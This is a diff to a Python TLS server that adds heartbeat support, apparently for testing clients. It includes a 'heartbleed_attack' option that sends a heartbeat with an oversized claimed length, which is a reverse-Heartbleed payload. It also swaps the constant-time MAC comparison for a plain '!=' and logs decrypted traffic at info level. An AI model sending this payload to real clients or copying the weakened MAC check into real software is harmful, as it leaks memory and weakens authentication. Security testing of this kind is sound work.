@@ -103,7 +103,7 @@ class TLS_RSA_WITH_RC4_128_SHA:
         
         calc = hmac.new(self.client_write_mac, authd, hashlib.sha1).digest()
 
-        if not hmac.compare_digest(calc, expect):
+        if calc != expect:
             raise IOError('Bad MAC')
     
     def decrypt(self, msg):
@@ -192,9 +192,15 @@ class server_handshake:
         # filled in by completed handshake
         self.suite = None
         self.version = None
+        self.has_heartbeat = False
 
         # after handshake, this is a buffer of outgoing tls messages
         self.outgoing = []
+
+        try:
+            self.plaintext.have_tls(self)
+        except:
+            pass
 
     def process_handshake(self, msg):
         try:
@@ -222,10 +228,14 @@ class server_handshake:
         return out
     
     def server_handshake(self):
+        info('Server handshake starts')
         handshake_messages = []
         hello = (yield None)
         assert hello is not None, 'EOF when waiting for clienthello'
+        info('Server got hello')
         hello.interpret_body()
+        debug(hello.to_json())
+        debug(hello.body.body.extensions)
 
         if not check_enum(ContentType, hello.type, ContentType.Handshake) or \
            not check_enum(HandshakeType, hello.body.type, HandshakeType.ClientHello):
@@ -246,6 +256,13 @@ class server_handshake:
 
         self.version = ProtocolVersion.TLSv1_0
         compression = Compression.Null
+        extensions = []
+
+        self.has_heartbeat = len([ext for ext in hello.body.body.extensions if ext.type == ExtensionType.Heartbeat and ext.data[0] == 1]) > 0
+        debug('heartbeat? ' + str(self.has_heartbeat))
+        if self.has_heartbeat:
+            extensions.append(Extension(type = ExtensionType.Heartbeat, data = bytes([1])))
+            debug('setting heartbeat extension %s' % extensions[-1])
 
         self.suite = choose_ciphersuite(hello.body.body.ciphersuites)
         debug('using ciphersuite %s', CipherSuite.tostring(self.suite.Suite))
@@ -259,10 +276,11 @@ class server_handshake:
                                                                    session_id = [],
                                                                    ciphersuite = self.suite.Suite,
                                                                    compression = compression,
-                                                                   extensions = [])
+                                                                   extensions = extensions)
                                                 )
                                )
         self.send(server_hello)
+        debug('Server hello sent')
         handshake_messages.append(server_hello.body)
 
         certificate = Message(type = ContentType.Handshake,
@@ -274,6 +292,7 @@ class server_handshake:
                                                )
                               )
         self.send(certificate)
+        debug('Server certificate sent')
         handshake_messages.append(certificate.body)
         
         server_hello_done = Message(type = ContentType.Handshake,
@@ -284,8 +303,10 @@ class server_handshake:
                                     )
         
         self.send(server_hello_done)
+        debug('Server hello-done sent')
         handshake_messages.append(server_hello_done.body)
         client_kx = (yield None)
+        debug('Server got client KX msg')
         client_kx.interpret_body()
 
         if not check_enum(ContentType, client_kx.type, ContentType.Handshake) or \
@@ -302,6 +323,7 @@ class server_handshake:
             return
 
         client_finished = (yield None)
+        debug('Server got client-finished msg')
         if not check_enum(ContentType, client_finished.type, ContentType.Handshake):
             return
 
@@ -316,28 +338,94 @@ class server_handshake:
                                      body = ChangeCipherSpec())
         server_finished = self.suite.produce_server_finished(self.version, handshake_messages)
 
+        debug('Server sends change-cipherspec, server-finished msgs')
         self.send(change_cipher_spec)
         self.send(server_finished)
+        info('Server handshake completed')
 
     def read_plaintext(self, request):
+        if request.type == ContentType.Heartbeat:
+            debug('we got a heartbeat from client')
+            self.suite.decrypt(request)
+
+            # offer to plaintext layer
+            try:
+                self.plaintext.incoming_heartbeat(request)
+                return
+            except Exception as e:
+                import sys
+                sys.excepthook(*sys.exc_info())
+                pass
+
+            # send response ourselves if plaintext layer doesn't
+            request.interpret_body()
+            if request.body.type == HeartbeatMessageType.Request:
+                self.write_heartbeat_response(request)
+            return
+
         if not check_enum(ContentType, request.type, ContentType.ApplicationData):
             error('unexpected tls message in application data stream; possible client invoked renegotation or shutdown (nyi)')
             self.close()
             return
 
         self.suite.decrypt(request)
-        debug('incoming message %r', request)
+        info('incoming message %r', request)
         self.plaintext.incoming(request.body)
 
     def flush_plaintext(self):
         for m in self.plaintext.flush():
             self.write_plaintext(m)
 
+    def write_heartbeat_response(self, req):
+        if not self.has_heartbeat:
+            debug('not sending heartbeat response (not negotiated)')
+            return
+
+        debug('sending heartbeat response')
+        msg = Message(type = ContentType.Heartbeat,
+                      version = self.version,
+                      body = Heartbeat(type = HeartbeatMessageType.Response,
+                                       payload = req.body.payload))
+        self.suite.encrypt(msg)
+        self.send(msg)
+
+    def write_heartbeat_request(self, heartbleed_attack = False):
+        if not self.has_heartbeat:
+            debug('not sending heartbeat request (not negotiated)')
+            return
+
+        if heartbleed_attack:
+            body = bytes([0x01, # request
+                          0x3f, 0xff, # len
+                          0x00])
+        else:
+            body = Heartbeat(type = HeartbeatMessageType.Request,
+                             payload = bytes([0]))
+
+        msg = Message(type = ContentType.Heartbeat,
+                      version = self.version,
+                      body = body)
+        self.suite.encrypt(msg)
+        self.send(msg)
+
     def write_plaintext(self, msg):
-        debug('outgoing message %r', msg)
+        info('outgoing message %r', msg)
         if msg is None:
             debug('plaintext source said EOF')
             self.send(None)
+            return
+
+        MAX_FRAGMENT = 0x3000 # lots of slop here
+
+        if len(msg) > MAX_FRAGMENT:
+            # fragment
+            i = 0
+            while True:
+                piece = msg[i * MAX_FRAGMENT:(i + 1) * MAX_FRAGMENT]
+                if len(piece) == 0:
+                    break
+                self.write_plaintext(piece)
+                i += 1
             return
 
         server_response = Message(type = ContentType.ApplicationData,
